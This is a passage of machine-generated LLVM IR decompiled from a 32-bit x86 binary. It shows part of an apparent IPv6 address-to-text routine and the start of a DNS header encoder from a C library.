  %v0_80501c467 = phi i32 [ -1, %dec_label_pc_80501a2 ], [ %v0_80501c47, %dec_label_pc_80501d9 ]
  %v0_80501e466 = phi i32 [ -1, %dec_label_pc_80501a2 ], [ %v0_80501c98, %dec_label_pc_80501d9 ]
  %v0_80501ef65 = phi i32 [ -1, %dec_label_pc_80501a2 ], [ %v0_80501d412, %dec_label_pc_80501d9 ]
  %v2_80501ac = mul nuw nsw i32 %v0_80501d968, 4
  %v3_80501ac = add nuw nsw i32 %v2_80501ac, 60
  %v4_80501ac = add i32 %v3_80501ac, %v0_80501ac.pre
  %v5_80501ac = inttoptr i32 %v4_80501ac to i32*
  %v6_80501ac = load i32, i32* %v5_80501ac, align 4
  %v7_80501ac = icmp eq i32 %v6_80501ac, 0
  %v1_80501b1 = icmp eq i1 %v7_80501ac, false
  %v10_80501c4 = icmp eq i32 %v0_80501c467, -1
  br i1 %v1_80501b1, label %dec_label_pc_80501c4, label %dec_label_pc_80501b3

dec_label_pc_80501b3:                             ; preds = %dec_label_pc_80501ac
  %v1_80501b6 = icmp eq i1 %v10_80501c4, false
  br i1 %v1_80501b6, label %dec_label_pc_80501c1, label %dec_label_pc_80501b8

dec_label_pc_80501b8:                             ; preds = %dec_label_pc_80501b3
  store i32 %v0_80501d968, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80501d9

dec_label_pc_80501c1:                             ; preds = %dec_label_pc_80501b3
  %v0_80501c1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80501c1 = add i32 %v0_80501c1, 1
  store i32 %v1_80501c1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80501d9

dec_label_pc_80501c4:                             ; preds = %dec_label_pc_80501ac
  br i1 %v10_80501c4, label %dec_label_pc_80501d9, label %dec_label_pc_80501c9

dec_label_pc_80501c9:                             ; preds = %dec_label_pc_80501c4
  %v10_80501c9 = icmp eq i32 %v0_80501e466, -1
  %v0_80501d2.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80501ce = load i32, i32* @ebp, align 4
  %v7_80501d0 = icmp sgt i32 %v0_80501d2.pre, %v1_80501ce
  %or.cond = or i1 %v10_80501c9, %v7_80501d0
  br i1 %or.cond, label %dec_label_pc_80501d2, label %dec_label_pc_80501d6

dec_label_pc_80501d2:                             ; preds = %dec_label_pc_80501c9
  store i32 %v0_80501d2.pre, i32* @ebp, align 4
  store i32 %v0_80501ef65, i32* @edi, align 4
  br label %dec_label_pc_80501d6

dec_label_pc_80501d6:                             ; preds = %dec_label_pc_80501c9, %dec_label_pc_80501d2
  %v0_80501c910 = phi i32 [ %v0_80501ef65, %dec_label_pc_80501d2 ], [ %v0_80501e466, %dec_label_pc_80501c9 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80501d9

dec_label_pc_80501d9:                             ; preds = %dec_label_pc_80501c4, %dec_label_pc_80501c1, %dec_label_pc_80501b8, %dec_label_pc_80501d6
  %v0_80501d412 = phi i32 [ %v0_80501ef65, %dec_label_pc_80501c4 ], [ %v0_80501ef65, %dec_label_pc_80501c1 ], [ %v0_80501d968, %dec_label_pc_80501b8 ], [ -1, %dec_label_pc_80501d6 ]
  %v0_80501c47 = phi i32 [ -1, %dec_label_pc_80501c4 ], [ %v0_80501c467, %dec_label_pc_80501c1 ], [ %v0_80501d968, %dec_label_pc_80501b8 ], [ -1, %dec_label_pc_80501d6 ]
  %v0_80501c98 = phi i32 [ %v0_80501e466, %dec_label_pc_80501c4 ], [ %v0_80501e466, %dec_label_pc_80501c1 ], [ %v0_80501e466, %dec_label_pc_80501b8 ], [ %v0_80501c910, %dec_label_pc_80501d6 ]
  %v1_80501d9 = add nuw nsw i32 %v0_80501d968, 1
  store i32 %v1_80501d9, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_80501d9, 8
  br i1 %exitcond, label %dec_label_pc_80501df, label %dec_label_pc_80501ac

dec_label_pc_80501df:                             ; preds = %dec_label_pc_80501d9
  %v10_80501df = icmp eq i32 %v0_80501d412, -1
  br i1 %v10_80501df, label %dec_label_pc_80501f1, label %dec_label_pc_80501e4

dec_label_pc_80501e4:                             ; preds = %dec_label_pc_80501df
  %v10_80501e4 = icmp eq i32 %v0_80501c98, -1
  %v0_80501ed.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_80501e4, label %dec_label_pc_80501ed, label %dec_label_pc_80501e9

dec_label_pc_80501e9:                             ; preds = %dec_label_pc_80501e4
  %v1_80501e9 = load i32, i32* @ebp, align 4
  %v7_80501eb = icmp sgt i32 %v0_80501ed.pre, %v1_80501e9
  br i1 %v7_80501eb, label %dec_label_pc_80501ed, label %dec_label_pc_80501f1

dec_label_pc_80501ed:                             ; preds = %dec_label_pc_80501e4, %dec_label_pc_80501e9
  store i32 %v0_80501ed.pre, i32* @ebp, align 4
  store i32 %v0_80501d412, i32* @edi, align 4
  br label %dec_label_pc_80501f1

dec_label_pc_80501f1:                             ; preds = %dec_label_pc_80501e9, %dec_label_pc_80501df, %dec_label_pc_80501ed
  %v5_80501fe = phi i32 [ %v0_80501c98, %dec_label_pc_80501e9 ], [ %v0_80501c98, %dec_label_pc_80501df ], [ %v0_80501d412, %dec_label_pc_80501ed ]
  %v10_80501f1 = icmp eq i32 %v5_80501fe, -1
  br i1 %v10_80501f1, label %dec_label_pc_8050201, label %dec_label_pc_80501f6

dec_label_pc_80501f6:                             ; preds = %dec_label_pc_80501f1
  %v0_80501f6 = load i32, i32* @ebp, align 4
  %v1_80501f6 = add i32 %v0_80501f6, -1
  %v6_80501f6 = sub i32 0, %v0_80501f6
  %v7_80501f6 = and i32 %v0_80501f6, %v6_80501f6
  %v8_80501f6 = icmp slt i32 %v7_80501f6, 0
  %v9_80501f6 = icmp eq i32 %v1_80501f6, 0
  %v10_80501f6 = icmp slt i32 %v1_80501f6, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_80501fe = icmp ne i1 %v10_80501f6, %v8_80501f6
  %v4_80501fe = or i1 %v9_80501f6, %v3_80501fe
  %v7_80501fe = select i1 %v4_80501fe, i32 -1, i32 %v5_80501fe
  store i32 %v7_80501fe, i32* @edi, align 4
  br label %dec_label_pc_8050201

dec_label_pc_8050201:                             ; preds = %dec_label_pc_80501f1, %dec_label_pc_80501f6
  %v0_80502a117 = phi i32 [ %v5_80501fe, %dec_label_pc_80501f1 ], [ %v7_80501fe, %dec_label_pc_80501f6 ]
  %v2_8050201 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8050201, i32* @ebx, align 4
  %v3_8050283 = add i32 %v4_8050160, 64
  %v12_8050241 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_80502a157 = icmp eq i32 %v0_80502a117, -1
  %v1_8050249 = icmp eq i1 %v12_8050241, false
  br label %dec_label_pc_805020c

dec_label_pc_805020c:                             ; preds = %dec_label_pc_8050201, %dec_label_pc_8050297
  %v10_80502a164 = phi i1 [ %v10_80502a157, %dec_label_pc_8050201 ], [ %v10_80502a1, %dec_label_pc_8050297 ]
  %v0_805022663 = phi i32 [ 0, %dec_label_pc_8050201 ], [ %v1_8050297, %dec_label_pc_8050297 ]
  %v1_805021c62 = phi i32 [ %v0_80502a117, %dec_label_pc_8050201 ], [ %v0_80502a1.pre, %dec_label_pc_8050297 ]
  %v0_805022a61 = phi i32 [ %v2_8050201, %dec_label_pc_8050201 ], [ %v0_805022018, %dec_label_pc_8050297 ]
  %stack_var_-120.160 = phi i8* [ null, %dec_label_pc_8050201 ], [ %stack_var_-120.0, %dec_label_pc_8050297 ]
  %stack_var_-116.159 = phi i32 [ 32, %dec_label_pc_8050201 ], [ %stack_var_-116.0, %dec_label_pc_8050297 ]
  br i1 %v10_80502a164, label %dec_label_pc_8050226, label %dec_label_pc_8050211

dec_label_pc_8050211:                             ; preds = %dec_label_pc_805020c
  %v2_8050211 = sub i32 %v0_805022663, %v1_805021c62
  %v8_8050211 = xor i32 %v0_805022663, %v1_805021c62
  %v9_8050211 = xor i32 %v2_8050211, %v0_805022663
  %v10_8050211 = and i32 %v9_8050211, %v8_8050211
  %v11_8050211 = icmp slt i32 %v10_8050211, 0
  %v12_8050211 = icmp eq i32 %v2_8050211, 0
  %v13_8050211 = icmp slt i32 %v2_8050211, 0
  %v2_8050213 = icmp eq i1 %v13_8050211, %v11_8050211
  br i1 %v2_8050213, label %dec_label_pc_8050215, label %dec_label_pc_8050226

dec_label_pc_8050215:                             ; preds = %dec_label_pc_8050211
  %v1_8050215 = load i32, i32* @ebp, align 4
  %v2_8050215 = add i32 %v1_8050215, %v1_805021c62
  store i32 %v2_8050215, i32* %eax.global-to-local, align 4
  %v2_8050218 = sub i32 %v0_805022663, %v2_8050215
  %v8_8050218 = xor i32 %v2_8050215, %v0_805022663
  %v9_8050218 = xor i32 %v2_8050218, %v0_805022663
  %v10_8050218 = and i32 %v9_8050218, %v8_8050218
  %v11_8050218 = icmp slt i32 %v10_8050218, 0
  %v13_8050218 = icmp slt i32 %v2_8050218, 0
  %v2_805021a = icmp eq i1 %v13_8050218, %v11_8050218
  br i1 %v2_805021a, label %dec_label_pc_8050226, label %dec_label_pc_805021c

dec_label_pc_805021c:                             ; preds = %dec_label_pc_8050215
  %v1_805021e = icmp eq i1 %v12_8050211, false
  br i1 %v1_805021e, label %dec_label_pc_8050297, label %dec_label_pc_8050220

dec_label_pc_8050220:                             ; preds = %dec_label_pc_805021c
  %v1_8050220 = inttoptr i32 %v0_805022a61 to i8*
  store i8 58, i8* %v1_8050220, align 1
  %v0_8050223 = load i32, i32* @ebx, align 4
  %v1_8050223 = add i32 %v0_8050223, 1
  store i32 %v1_8050223, i32* @ebx, align 4
  br label %dec_label_pc_8050297

dec_label_pc_8050226:                             ; preds = %dec_label_pc_8050211, %dec_label_pc_8050215, %dec_label_pc_805020c
  %v1_8050226 = icmp eq i32 %v0_805022663, 0
  br i1 %v1_8050226, label %dec_label_pc_805022e, label %dec_label_pc_805022a

dec_label_pc_805022a:                             ; preds = %dec_label_pc_8050226
  %v1_805022a = inttoptr i32 %v0_805022a61 to i8*
  store i8 58, i8* %v1_805022a, align 1
  %v0_805022d = load i32, i32* @ebx, align 4
  %v1_805022d = add i32 %v0_805022d, 1
  store i32 %v1_805022d, i32* @ebx, align 4
  %v0_805022e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805022e

dec_label_pc_805022e:                             ; preds = %dec_label_pc_8050226, %dec_label_pc_805022a
  %v0_805028c = phi i32 [ %v0_805022a61, %dec_label_pc_8050226 ], [ %v1_805022d, %dec_label_pc_805022a ]
  %v1_8050283 = phi i32 [ 0, %dec_label_pc_8050226 ], [ %v0_805022e.pre, %dec_label_pc_805022a ]
  %v9_805022e = icmp eq i32 %v1_8050283, 6
  %v1_8050231 = icmp eq i1 %v9_805022e, false
  br i1 %v1_8050231, label %dec_label_pc_8050282, label %dec_label_pc_8050233

dec_label_pc_8050233:                             ; preds = %dec_label_pc_805022e
  %v0_8050233 = load i32, i32* @edi, align 4
  %v1_8050233 = icmp eq i32 %v0_8050233, 0
  %v1_8050235 = icmp eq i1 %v1_8050233, false
  br i1 %v1_8050235, label %dec_label_pc_8050282, label %dec_label_pc_8050237

dec_label_pc_8050237:                             ; preds = %dec_label_pc_8050233
  %v0_8050237 = load i32, i32* @ebp, align 4
  %v9_8050237 = icmp eq i32 %v0_8050237, 6
  br i1 %v9_8050237, label %dec_label_pc_805024b, label %dec_label_pc_805023c

dec_label_pc_805023c:                             ; preds = %dec_label_pc_8050237
  %v9_805023c = icmp eq i32 %v0_8050237, 5
  %v1_805023f = icmp eq i1 %v9_805023c, false
  br i1 %v1_805023f, label %dec_label_pc_8050282, label %dec_label_pc_8050241

dec_label_pc_8050241:                             ; preds = %dec_label_pc_805023c
  br i1 %v1_8050249, label %dec_label_pc_8050282, label %dec_label_pc_805024b

dec_label_pc_805024b:                             ; preds = %dec_label_pc_8050241, %dec_label_pc_8050237
  %v2_8050251 = sub i32 %v0_805028c, %v2_8050201
  store i32 %v2_8050251, i32* @esi, align 4
  %v2_805025c = sub i32 46, %v2_8050251
  store i32 %v2_805025c, i32* @ecx, align 4
  store i32 %v0_805028c, i32* @edx, align 4
  %v1_8050260 = add i32 %arg2, 12
  store i32 %v1_8050260, i32* @eax, align 4
  %v0_8050263 = load i8*, i8** %stack_var_-124, align 4
  %v1_8050263 = ptrtoint i8* %v0_8050263 to i32
  %v3_8050263 = ptrtoint i8* %stack_var_-120.160 to i32
  %v5_8050263 = call i32 @inet_ntop4(i32 %v1_8050263, i32 %v3_8050263, i32 %stack_var_-116.159)
  store i32 %v5_8050263, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805026a = icmp eq i32 %v5_8050263, 0
  br i1 %v1_805026a, label %dec_label_pc_80502f4, label %dec_label_pc_8050272

dec_label_pc_8050272:                             ; preds = %dec_label_pc_805024b
  %v0_8050275 = load i32, i32* @ebx, align 4
  %v5_8050275 = inttoptr i32 %v0_8050275 to i8*
  store i8* %v5_8050275, i8** %stack_var_-124, align 4
  %v3_8050276 = call i32 @strlen(i8* %v5_8050275)
  store i32 %v3_8050276, i32* %eax.global-to-local, align 4
  %v0_805027e = load i32, i32* @ebx, align 4
  %v3_805027e = add i32 %v0_805027e, %v3_8050276
  store i32 %v3_805027e, i32* @ebx, align 4
  %v0_80502a6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80502a6

dec_label_pc_8050282:                             ; preds = %dec_label_pc_8050241, %dec_label_pc_805023c, %dec_label_pc_8050233, %dec_label_pc_805022e
  %v0_8050282 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050282, i32* %stack_var_-112, align 4
  %v2_8050283 = mul i32 %v1_8050283, 4
  %v4_8050283 = add i32 %v3_8050283, %v2_8050283
  %v5_8050283 = inttoptr i32 %v4_8050283 to i32*
  %v6_8050283 = load i32, i32* %v5_8050283, align 4
  %v5_805028c = inttoptr i32 %v0_805028c to i8*
  store i8* %v5_805028c, i8** %stack_var_-124, align 4
  %v6_805028d = call i32 @sprintf(i32 %v0_805028c, i32 ptrtoint ([3 x i8]* @global_var_8052dd1.415 to i32), i32 %v6_8050283, i32 %v0_8050282)
  store i32 %v6_805028d, i32* %eax.global-to-local, align 4
  %v0_8050295 = load i32, i32* @ebx, align 4
  %v2_8050295 = add i32 %v0_8050295, %v6_805028d
  store i32 %v2_8050295, i32* @ebx, align 4
  br label %dec_label_pc_8050297

dec_label_pc_8050297:                             ; preds = %dec_label_pc_805021c, %dec_label_pc_8050220, %dec_label_pc_8050282
  %stack_var_-116.0 = phi i32 [ %v6_8050283, %dec_label_pc_8050282 ], [ %stack_var_-116.159, %dec_label_pc_805021c ], [ %stack_var_-116.159, %dec_label_pc_8050220 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8052dd1.415, i32 0, i32 0), %dec_label_pc_8050282 ], [ %stack_var_-120.160, %dec_label_pc_805021c ], [ %stack_var_-120.160, %dec_label_pc_8050220 ]
  %v0_805022018 = phi i32 [ %v2_8050295, %dec_label_pc_8050282 ], [ %v0_805022a61, %dec_label_pc_805021c ], [ %v1_8050223, %dec_label_pc_8050220 ]
  %v0_8050297 = load i32, i32* @esi, align 4
  %v1_8050297 = add i32 %v0_8050297, 1
  %v0_80502a1.pre = load i32, i32* @edi, align 4
  store i32 %v1_8050297, i32* @esi, align 4
  %v7_805029b = icmp sgt i32 %v1_8050297, 7
  %v10_80502a1 = icmp eq i32 %v0_80502a1.pre, -1
  br i1 %v7_805029b, label %dec_label_pc_80502a1, label %dec_label_pc_805020c

dec_label_pc_80502a1:                             ; preds = %dec_label_pc_8050297
  br i1 %v10_80502a1, label %dec_label_pc_80502b2, label %dec_label_pc_80502a6

dec_label_pc_80502a6:                             ; preds = %dec_label_pc_80502a1, %dec_label_pc_8050272
  %v0_80502ae = phi i32 [ %v0_805022018, %dec_label_pc_80502a1 ], [ %v3_805027e, %dec_label_pc_8050272 ]
  %v0_80502a6 = phi i32 [ %v0_80502a1.pre, %dec_label_pc_80502a1 ], [ %v0_80502a6.pre, %dec_label_pc_8050272 ]
  %v1_80502a6 = load i32, i32* @ebp, align 4
  %v2_80502a6 = add i32 %v1_80502a6, %v0_80502a6
  store i32 %v2_80502a6, i32* %eax.global-to-local, align 4
  %v9_80502a9 = icmp eq i32 %v2_80502a6, 8
  %v1_80502ac = icmp eq i1 %v9_80502a9, false
  br i1 %v1_80502ac, label %dec_label_pc_80502b2, label %dec_label_pc_80502ae

dec_label_pc_80502ae:                             ; preds = %dec_label_pc_80502a6
  %v1_80502ae = inttoptr i32 %v0_80502ae to i8*
  store i8 58, i8* %v1_80502ae, align 1
  %v0_80502b1 = load i32, i32* @ebx, align 4
  %v1_80502b1 = add i32 %v0_80502b1, 1
  store i32 %v1_80502b1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80502b2

dec_label_pc_80502b2:                             ; preds = %dec_label_pc_80502a6, %dec_label_pc_80502a1, %dec_label_pc_80502ae
  %v0_80502b6 = phi i32 [ %v0_80502ae, %dec_label_pc_80502a6 ], [ %v0_805022018, %dec_label_pc_80502a1 ], [ %v1_80502b1, %dec_label_pc_80502ae ]
  store i32 %v2_8050201, i32* %edx.global-to-local, align 4
  %v1_80502b6 = add i32 %v0_80502b6, 1
  store i32 %v1_80502b6, i32* %eax.global-to-local, align 4
  %v1_80502b9 = inttoptr i32 %v0_80502b6 to i8*
  store i8 0, i8* %v1_80502b9, align 1
  %v0_80502bc = load i32, i32* %eax.global-to-local, align 4
  %v1_80502bc = load i32, i32* %edx.global-to-local, align 4
  %v2_80502bc = sub i32 %v0_80502bc, %v1_80502bc
  store i32 %v2_80502bc, i32* @eax, align 4
  %tmp74 = icmp ugt i32 %v2_80502bc, %arg4
  br i1 %tmp74, label %dec_label_pc_80502c4, label %dec_label_pc_80502d1

dec_label_pc_80502c4:                             ; preds = %dec_label_pc_80502b2
  %v0_80502c4 = load i8*, i8** %stack_var_-124, align 4
  %v1_80502c4 = ptrtoint i8* %v0_80502c4 to i32
  %v2_80502c4 = call i32 @__errno_location(i32 %v1_80502c4)
  store i32 %v2_80502c4, i32* %eax.global-to-local, align 4
  %v1_80502c9 = inttoptr i32 %v2_80502c4 to i32*
  store i32 28, i32* %v1_80502c9, align 4
  br label %dec_label_pc_80502f2

dec_label_pc_80502d1:                             ; preds = %dec_label_pc_80502b2
  %v0_80502d1 = load i32, i32* @edi, align 4
  store i32 %v0_80502d1, i32* %stack_var_-112, align 4
  %tmp44 = bitcast i8** %stack_var_12 to i32*
  %v3_80502d41 = load i32, i32* %tmp44, align 4
  %tmp45 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_80502d41, i32* %tmp45, align 4
  %v0_80502db.cast = inttoptr i32 %v3_80502d41 to i8*
  %v5_80502db = call i32 @strcpy(i8* %v0_80502db.cast, i32 %v2_8050201)
  store i32 %v5_80502db, i32* %eax.global-to-local, align 4
  store i32 %v5_80502db, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80502f4

dec_label_pc_80502e7:                             ; preds = %dec_label_pc_805013d
  %v1_80502e7 = call i32 @__errno_location(i32 %v0_8050130)
  store i32 %v1_80502e7, i32* %eax.global-to-local, align 4
  %v1_80502ec = inttoptr i32 %v1_80502e7 to i32*
  store i32 97, i32* %v1_80502ec, align 4
  br label %dec_label_pc_80502f2

dec_label_pc_80502f2:                             ; preds = %dec_label_pc_80502c4, %dec_label_pc_80502e7
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80502f4

dec_label_pc_80502f4:                             ; preds = %dec_label_pc_805024b, %dec_label_pc_80502d1, %dec_label_pc_8050148, %dec_label_pc_80502f2
  %v0_80502f7 = phi i32 [ 0, %dec_label_pc_805024b ], [ %v5_80502db, %dec_label_pc_80502d1 ], [ %v3_8050154, %dec_label_pc_8050148 ], [ 0, %dec_label_pc_80502f2 ]
  store i32 %v0_80502f7, i32* %eax.global-to-local, align 4
  store i32 %v0_8050130, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80502f7

; uselistorder directives
  uselistorder i32 %v0_80502f7, { 1, 0 }
  uselistorder i32 %v0_80502b6, { 1, 0 }
  uselistorder i1 %v10_80502a1, { 1, 0 }
  uselistorder i32 %v0_80502a1.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8050297, { 1, 0, 2 }
  uselistorder i32 %v1_8050283, { 1, 0 }
  uselistorder i32 %v0_805028c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_8050218, { 1, 0 }
  uselistorder i32 %v2_8050211, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.159, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.160, { 2, 1, 0 }
  uselistorder i32 %v0_805022a61, { 3, 2, 1, 0 }
  uselistorder i32 %v1_805021c62, { 2, 1, 0 }
  uselistorder i32 %v0_805022663, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_8050201, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_80502a117, { 1, 0 }
  uselistorder i32 %v1_80501f6, { 1, 0 }
  uselistorder i32 %v0_80501f6, { 1, 0, 2 }
  uselistorder i32 %v5_80501fe, { 1, 2, 0 }
  uselistorder i32 %v1_80501d9, { 0, 2, 1 }
  uselistorder i32 %v0_80501c98, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80501d412, { 1, 2, 0, 3 }
  uselistorder i1 %v10_80501c4, { 1, 0 }
  uselistorder i32 %v0_80501ef65, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80501e466, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80501d968, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805019169, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8050130, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 97, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 1, 0 }
  uselistorder [3 x i8]* @global_var_8052dd1.415, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 64, { 7, 2, 5, 9, 3, 6, 8, 1, 4, 0 }
  uselistorder i32* @esp, { 0, 1, 26, 7, 27, 28, 29, 30, 31, 32, 8, 34, 2, 35, 36, 37, 38, 39, 40, 10, 41, 42, 43, 44, 45, 16, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 12, 56, 57, 58, 13, 59, 9, 60, 61, 62, 63, 64, 65, 14, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 11, 79, 80, 81, 82, 83, 84, 15, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 17, 107, 3, 4, 151, 5, 6, 18, 108, 109, 110, 111, 19, 112, 113, 114, 115, 22, 116, 117, 118, 23, 119, 24, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 21, 133, 25, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 20, 146, 147, 148, 149, 33, 150 }
  uselistorder i32 15, { 0, 1, 4, 2, 3 }
  uselistorder i32 60, { 5, 6, 7, 8, 0, 9, 4, 2, 1, 3 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 12 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 3, 4, 5, 6, 10, 8, 9, 7, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80502f4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80502f2, { 1, 0 }
  uselistorder label %dec_label_pc_80502b2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050297, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805022e, { 1, 0 }
  uselistorder label %dec_label_pc_8050226, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805020c, { 1, 0 }
  uselistorder label %dec_label_pc_8050201, { 1, 0 }
  uselistorder label %dec_label_pc_80501f1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80501ed, { 1, 0 }
  uselistorder label %dec_label_pc_80501d9, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80501d6, { 1, 0 }
  uselistorder label %dec_label_pc_80501ac, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8050304 = load i32, i32* @ebx, align 4
  store i32 %v0_8050304, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_805030e = ptrtoint i8* %tmp to i32
  store i32 %v4_805030e, i32* %esi.global-to-local, align 4
  %v7_8050312 = icmp sgt i32 %tmp9, 11
  br i1 %v7_8050312, label %dec_label_pc_8050318, label %dec_label_pc_80503ac

dec_label_pc_8050318:                             ; preds = %entry
  %v1_8050318 = add i32 %tmp8, 1
  %v2_8050318 = inttoptr i32 %v1_8050318 to i8*
  %v3_8050318 = load i8, i8* %v2_8050318, align 1
  store i8 %v3_8050318, i8* %tmp, align 1
  %v0_805031e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805031e = inttoptr i32 %v0_805031e to i32*
  %v2_805031e = load i32, i32* %v1_805031e, align 4
  %v1_8050320 = trunc i32 %v2_805031e to i8
  %v2_8050320 = load i32, i32* %esi.global-to-local, align 4
  %v3_8050320 = add i32 %v2_8050320, 1
  %v4_8050320 = inttoptr i32 %v3_8050320 to i8*
  store i8 %v1_8050320, i8* %v4_8050320, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_8050345 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050345 = add i32 %v0_8050345, 8
  %v2_8050345 = inttoptr i32 %v1_8050345 to i32*
  %v3_8050345 = load i32, i32* %v2_8050345, align 4
  %v1_8050348 = mul i32 %v3_8050345, 8
  %v2_805034b = and i32 %v1_8050348, 120
  %v2_805034e = or i32 %v2_805034b, 4
  store i32 %v2_805034e, i32* %edx.global-to-local, align 4
  %v1_8050350 = add i32 %v0_8050345, 20
  %v2_8050350 = inttoptr i32 %v1_8050350 to i32*
  %v3_8050350 = load i32, i32* %v2_8050350, align 4
  %v4_8050350 = icmp eq i32 %v3_8050350, 0
  %v1_8050354 = icmp eq i1 %v4_8050350, false
  %v2_8050354 = zext i1 %v1_8050354 to i32
  %v2_8050357 = or i32 %v2_8050354, %v2_805034e
  store i32 %v2_8050357, i32* %edx.global-to-local, align 4
  %v2_8050359 = or i32 %v2_8050357, 130
  %v3_8050359 = trunc i32 %v2_8050359 to i8
  store i32 %v2_8050359, i32* @ecx, align 4
  %v2_805035b = load i32, i32* %esi.global-to-local, align 4
  %v3_805035b = add i32 %v2_805035b, 2
  %v4_805035b = inttoptr i32 %v3_805035b to i8*
  store i8 %v3_8050359, i8* %v4_805035b, align 1
  %v0_805035e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050362 = add i32 %v0_805035e, 28
  %v2_8050362 = inttoptr i32 %v1_8050362 to i8*
  %v3_8050362 = load i8, i8* %v2_8050362, align 1
  %v5_8050362 = load i32, i32* %edx.global-to-local, align 4
  %v2_805036b = urem i8 %v3_8050362, 16
  %v7_805036b = zext i8 %v2_805036b to i32
  %v9_805036b = and i32 %v5_8050362, -256
  %v10_805036b = or i32 %v9_805036b, %v7_805036b
  store i32 %v10_805036b, i32* %edx.global-to-local, align 4
  %v2_805036e = or i8 %v2_805036b, -128
  %v2_8050370 = load i32, i32* %esi.global-to-local, align 4
  %v3_8050370 = add i32 %v2_8050370, 3
  %v4_8050370 = inttoptr i32 %v3_8050370 to i8*
  store i8 %v2_805036e, i8* %v4_8050370, align 1
  %v0_8050373 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050373 = add i32 %v0_8050373, 33
  %v2_8050373 = inttoptr i32 %v1_8050373 to i8*
  %v3_8050373 = load i8, i8* %v2_8050373, align 1
  %v2_8050377 = load i32, i32* %esi.global-to-local, align 4
  %v3_8050377 = add i32 %v2_8050377, 4
  %v4_8050377 = inttoptr i32 %v3_8050377 to i8*
  store i8 %v3_8050373, i8* %v4_8050377, align 1
  %v0_805037a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805037a = add i32 %v0_805037a, 32
  %v2_805037a = inttoptr i32 %v1_805037a to i32*
  %v3_805037a = load i32, i32* %v2_805037a, align 4
  %v1_805037d = trunc i32 %v3_805037a to i8
  %v2_805037d = load i32, i32* %esi.global-to-local, align 4
  %v3_805037d = add i32 %v2_805037d, 5
  %v4_805037d = inttoptr i32 %v3_805037d to i8*
  store i8 %v1_805037d, i8* %v4_805037d, align 1
  %v0_8050380 = load i32, i32* %ebx.global-to-local, align 4
